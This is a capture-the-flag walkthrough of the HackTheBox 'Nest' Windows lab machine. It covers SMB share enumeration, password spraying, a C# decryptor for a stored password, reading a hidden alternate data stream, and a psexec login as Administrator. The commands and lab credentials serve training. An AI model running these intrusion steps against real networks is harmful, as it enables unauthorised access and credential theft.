---
title: HTB | Nest
author: Zeropio
date: 2022-12-26
categories: [Pentesting, HackTheBox]
tags: [htb, windows, easy, machines]
permalink: /pentesting/htb/machines/nest
---

![HTB Img](/assets/img/hackthebox/card/Nest.png)

# Fingerprint

## Scan

The scan show:

```
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data.
```

## Enumeration

The SMB server cannot be listed:

```console
$ smbclient -N -L \\\\10.10.10.178\\

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk
```

The non-authenticate user doesn’t have access to the whole SMB, but it can download two files from **Data** and see the **Users**:

```console
$ smbclient -N \\\\10.10.10.178\\Users
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 23:04:21 2020
  ..                                  D        0  Sat Jan 25 23:04:21 2020
  Administrator                       D        0  Fri Aug  9 16:08:23 2019
  C.Smith                             D        0  Sun Jan 26 07:21:44 2020
  L.Frost                             D        0  Thu Aug  8 18:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 18:02:50 2019
  TempUser                            D        0  Wed Aug  7 23:55:56 2019
```

This are the files founded:

```console
$ cat Maintenance\ Alerts.txt 
There is currently no scheduled maintenance work

$ cat Welcome\ Email.txt     
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019

Thank you
HR
```

---

# Footprint

## Initial Access

We can test this credentials:

```console
$ crackmapexec smb 10.10.10.178 -u TempUser -p welcome2019
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\TempUser:welcome2019
```

Now we can download a file from the **TempUser** folder;

```console
$ smbclient \\\\10.10.10.178\\Users -U TempUser -p 'welcome2019' 
Password for [WORKGROUP\TempUser]:
```

We can retreive a blank file from there. Going back to the user list, we can do a password spraying with them:

```console
$ crackmapexec smb 10.10.10.178 -u usernames.txt -p welcome2019 
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [-] HTB-NEST\C.Smith:welcome2019 STATUS_LOGON_FAILURE 
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\L.Frost:welcome2019
```

**TempUser** can access the **Data** folder with new directories we cannot access before. We can download the following files:

```
.
├── adobe
│   ├── editing.xml
│   ├── Options.txt
│   ├── projects.xml
│   └── settings.xml
├── atlas
│   └── Temp.XML
├── microsoft
│   └── Options.xml
├── notepad
│   ├── config.xml
│   └── shortcuts.xml
└── ru
    └── RU_config.xml
```

Inside `atlas/Temp.XML`{: .filepath} we found some references to usernames:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<bs:Brainstorm
	xmlns:bs="http://schemas.microsoft.com/visio/2003/brainstorming">
	<bs:topic bs:TopicID="T1">
		<bs:text>Marketing Plan</bs:text>
		<bs:topic bs:TopicID="T1.1">
			<bs:text>Product</bs:text>
			<bs:prop>
				<bs:id>1</bs:id>
				<bs:label>Assigned to</bs:label>
				<bs:value>Deanna Meyer</bs:value>
			</bs:prop>
			<bs:topic bs:TopicID="T1.1.1">
				<bs:text>New features</bs:text>
			</bs:topic>
			<bs:topic bs:TopicID="T1.1.2">
				<bs:text>Competitive strengths</bs:text>
			</bs:topic>
			<bs:topic bs:TopicID="T1.1.3">
				<bs:text>Competitive weaknesses</bs:text>
			</bs:topic>
		</bs:topic>
		<bs:topic bs:TopicID="T1.2">
			<bs:text>Placement</bs:text>
			<bs:prop>
				<bs:id>1</bs:id>
				<bs:label>Assigned to</bs:label>
				<bs:value>Jolie Lenehan</bs:value>
			</bs:prop>
		</bs:topic>
		<bs:topic bs:TopicID="T1.3">
			<bs:text>Price</bs:text>
			<bs:prop>
				<bs:id>1</bs:id>
				<bs:label>Assigned to</bs:label>
				<bs:value>Robert O'Hara</bs:value>
			</bs:prop>
		</bs:topic>
		<bs:topic bs:TopicID="T1.4">
			<bs:text>Promotion</bs:text>
			<bs:prop>
				<bs:id>1</bs:id>
				<bs:label>Assigned to</bs:label>
				<bs:value>Robert O'Hara</bs:value>
			</bs:prop>
			<bs:topic bs:TopicID="T1.4.1">
				<bs:text>Advertising</bs:text>
			</bs:topic>
			<bs:topic bs:TopicID="T1.4.2">
				<bs:text>Mailings</bs:text>
			</bs:topic>
			<bs:topic bs:TopicID="T1.4.3">
				<bs:text>Trade shows</bs:text>
			</bs:topic>
		</bs:topic>
	</bs:topic>
	<bs:association bs:topic1="T1.4" bs:topic2="T1.3"/>
</bs:Brainstorm>
```

We have here **Deanna Meyer** and **Robert O'Hara**, following the previous user we can get it as **D.Meyer** and **R.Ohara**.

We also found references to a file, with a new user **Carl**:

```xml
<File filename="C:\windows\System32\drivers\etc\hosts" />
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
<File filename="C:\Users\C.Smith\Desktop\todo.txt" />
```

The file `ru/RU_config.xml`{: .filepath} contents a pair of credentials:

```xml
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>
</Password>
</ConfigFile>
```

If we search that port we found that it is filtered:

```
PORT    STATE    SERVICE VERSION
389/tcp filtered ldap
```

We cannot access `\\\\10.10.10.178\\Secure$\IT\`{: .filepath}, but we can access `\\\\10.10.10.178\\Secure$\IT\Carl`{: .filepath}:

```console
$ smbmap -H 10.10.10.178 -u TempUser -p welcome2019 -R 'Secure$\IT\Carl'
[+] IP: 10.10.10.178:445        Name: HTB-NEST                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Secure$                                                 READ ONLY
        .\Secure$IT\Carl\*
        dr--r--r--                0 Wed Jul 21 19:47:13 2021    .
        dr--r--r--                0 Wed Jul 21 19:47:13 2021    ..
        dr--r--r--                0 Wed Jul 21 19:47:13 2021    Docs
        dr--r--r--                0 Tue Aug  6 14:45:47 2019    Reports
        dr--r--r--                0 Tue Aug  6 15:41:55 2019    VB Projects
        .\Secure$IT\Carl\Docs\*
        dr--r--r--                0 Wed Jul 21 19:47:13 2021    .
        dr--r--r--                0 Wed Jul 21 19:47:13 2021    ..
        fr--r--r--               56 Wed Jul 21 19:47:13 2021    ip.txt
        fr--r--r--               73 Wed Jul 21 19:47:13 2021    mmc.txt
        .\Secure$IT\Carl\VB Projects\*
        dr--r--r--                0 Tue Aug  6 15:41:55 2019    .
        dr--r--r--                0 Tue Aug  6 15:41:55 2019    ..
        dr--r--r--                0 Tue Aug  6 15:41:53 2019    Production
        dr--r--r--                0 Tue Aug  6 15:47:41 2019    WIP
        .\Secure$IT\Carl\VB Projects\WIP\*
        dr--r--r--                0 Tue Aug  6 15:47:41 2019    .
        dr--r--r--                0 Tue Aug  6 15:47:41 2019    ..
        dr--r--r--                0 Wed Jul 21 19:47:17 2021    RU
        .\Secure$IT\Carl\VB Projects\WIP\RU\*
        dr--r--r--                0 Wed Jul 21 19:47:17 2021    .
        dr--r--r--                0 Wed Jul 21 19:47:17 2021    ..
        dr--r--r--                0 Wed Jul 21 19:47:14 2021    RUScanner
        fr--r--r--              871 Wed Jul 21 19:47:17 2021    RUScanner.sln
        .\Secure$IT\Carl\VB Projects\WIP\RU\RUScanner\*
        dr--r--r--                0 Wed Jul 21 19:47:14 2021    .
        dr--r--r--                0 Wed Jul 21 19:47:14 2021    ..
        dr--r--r--                0 Wed Aug  7 21:00:11 2019    bin
        fr--r--r--              772 Wed Jul 21 19:47:15 2021    ConfigFile.vb
        fr--r--r--              279 Wed Jul 21 19:47:15 2021    Module1.vb
        dr--r--r--                0 Wed Aug  7 21:00:11 2019    My Project
        dr--r--r--                0 Wed Aug  7 21:00:11 2019    obj
        fr--r--r--             4828 Wed Jul 21 19:47:14 2021    RU Scanner.vbproj
        fr--r--r--              143 Wed Jul 21 19:47:13 2021    RU Scanner.vbproj.user
        fr--r--r--              133 Wed Jul 21 19:47:14 2021    SsoIntegration.vb
        fr--r--r--             4888 Wed Jul 21 19:47:15 2021    Utils.vb
```

Mount the SMB to have a better control:

```console
$ sudo mount -t cifs -o ro,username=TempUser,password=welcome2019 '//10.10.10.178/Secure$' /mnt/smb
```

Now we can access the `Secure$/IT/Carl`{: .filepath} folder. Searching in it we found a suspicious file, **Utils.vb** which decrypt the previous founded password. We can convert this Visual Basic code into C# and then use [Mono](https://www.mono-project.com/) to create a binary:

```csharp
using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
namespace Dec {
  class Decryptor {
    public static void Main() {
      var pt = Decrypt("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=", "N3st22",
        "88552299", 2, "464R5DFA5DL6LE28", 256);
      Console.WriteLine("Plaintext: " + pt);
    }
    public static String Decrypt(String cipherText, String passPhrase, String saltValue, int passwordIterations, String initVector, int keySize) {
      var initVectorBytes = Encoding.ASCII.GetBytes(initVector);
      var saltValueBytes = Encoding.ASCII.GetBytes(saltValue);
      var cipherTextBytes = Convert.FromBase64String(cipherText);
      var password = new Rfc2898DeriveBytes(passPhrase, saltValueBytes,
        passwordIterations);
      var keyBytes = password.GetBytes(keySize / 8);
      var symmetricKey = new AesCryptoServiceProvider();
      symmetricKey.Mode = CipherMode.CBC;
      var decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes);
      var memoryStream = new MemoryStream(cipherTextBytes);
      var cryptoStream = new CryptoStream(memoryStream, decryptor,
        CryptoStreamMode.Read);
      var plainTextBytes = new byte[cipherTextBytes.Length];
      var decryptedByteCount = cryptoStream.Read(plainTextBytes, 0,
        plainTextBytes.Length);
      memoryStream.Close();
      cryptoStream.Close();
      var plainText = Encoding.ASCII.GetString(plainTextBytes, 0,
        decryptedByteCount);
      return plainText;
    }
  }
}
```

```console
$ mcs decrypt.cs
$ ./decrypt.exe 
Plaintext: xRxRxPANCAK3SxRxRx
```

We can test the credentials now:

```console
$ crackmapexec smb 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx
SMB         10.10.10.178    445    HTB-NEST         [*] Windows 6.1 Build 7601 (name:HTB-NEST) (domain:HTB-NEST) (signing:False) (SMBv1:False)
SMB         10.10.10.178    445    HTB-NEST         [+] HTB-NEST\C.Smith:xRxRxPANCAK3SxRxRx

$ smbmap -H 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx                      
[+] IP: 10.10.10.178:445        Name: HTB-NEST                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 READ ONLY
        Users                                                   READ ONLY
```

## Privilege Escalation

We will download all the files that we can access with this user:

```console
$ smbmap -H 10.10.10.178 -u C.Smith -p xRxRxPANCAK3SxRxRx -R Users
[+] IP: 10.10.10.178:445        Name: HTB-NEST                                          
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\Users\*
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 23:04:21 2020    ..
        dr--r--r--                0 Wed Jul 21 19:47:04 2021    Administrator
        dr--r--r--                0 Wed Jul 21 19:47:04 2021    C.Smith
        dr--r--r--                0 Thu Aug  8 18:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 18:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Jul 21 19:47:15 2021    TempUser
        .\Users\C.Smith\*
        dr--r--r--                0 Wed Jul 21 19:47:04 2021    .
        dr--r--r--                0 Wed Jul 21 19:47:04 2021    ..
        dr--r--r--                0 Wed Jul 21 19:47:05 2021    HQK Reporting
        fr--r--r--               34 Mon Dec 26 10:59:43 2022    user.txt
        .\Users\C.Smith\HQK Reporting\*
        dr--r--r--                0 Wed Jul 21 19:47:05 2021    .
        dr--r--r--                0 Wed Jul 21 19:47:05 2021    ..
        dr--r--r--                0 Fri Aug  9 13:18:42 2019    AD Integration Module
        fr--r--r--                0 Wed Jul 21 19:47:12 2021    Debug Mode Password.txt
        fr--r--r--              249 Wed Jul 21 19:47:14 2021    HQK_Config_Backup.xml
        .\Users\C.Smith\HQK Reporting\AD Integration Module\*
        dr--r--r--                0 Fri Aug  9 13:18:42 2019    .
        dr--r--r--                0 Fri Aug  9 13:18:42 2019    ..
        fr--r--r--            17408 Thu Aug  8 00:42:49 2019    HqkLdap.exe
```

We can see that there is a file with ADS:

```console
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Fri Aug  9 00:06:12 2019 BST
access_time:    Fri Aug  9 00:06:12 2019 BST
write_time:     Fri Aug  9 00:08:17 2019 BST
change_time:    Wed Jul 21 19:47:12 2021 BST
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes

smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
```

And here we have it:

```console
$ cat Debug\ Mode\ Password.txt:Password 
WBQ201953D8w
```

One of the files is a XML with the following information:

```xml
<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>
```

We can see that we can do all type of queries there.

```console
$ telnet 10.10.10.178 4386
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is '^]'.

HQK Reporting Service V1.2

>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  COMPARISONS
[1]   Invoices (Ordered By Customer)
[2]   Products Sold (Ordered By Customer)
[3]   Products Sold In Last 30 Days

Current Directory: ALL QUERIES
>
```

We can now try to enable **DEBUG** with the previous password:

```console
>debug WBQ201953D8w
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>

>showquery 2
```

This will show a new password. We can use the previous decrypt to get the new password:

```console
$ mcs decrypt.cs
$ ./decrypt.exe
Plaintext: XtH4nkS4Pl4y1nGX
```

We can try now to login with this credentials:

```console
$ psexec.py Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
C:\Windows\system32> whoami
nt authority\system
```
